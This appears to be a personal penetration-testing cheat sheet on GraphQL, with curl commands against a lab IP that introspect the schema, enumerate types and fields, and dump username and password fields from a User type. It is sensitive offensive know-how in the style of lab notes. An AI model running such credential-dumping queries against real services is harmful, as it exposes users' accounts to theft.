---
title: "Graphql"
date: 2024-7-9
tags: ["graphql", "database"]
---

---
### Visualize Tool

[graphql-voyager](https://graphql-kit.com/graphql-voyager/)

```
+---------------------------------------------------------------+
| 1. Change Schema -> Introspection -> Copy Introspection Query |
| 2. Paste query                                                |
| 3. Display                                                    |
+---------------------------------------------------------------+
```

### Basic Commands

```bash
# Get fields from schema
curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq .
```

```bash
# Get types name
curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq .
```

```bash
# Get fields of type (e.g. User)
curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq .
```

```bash
# Dump data from type (e.g. User type with fields username and password)
curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{User{username,password}}"}' | jq .
```

<br>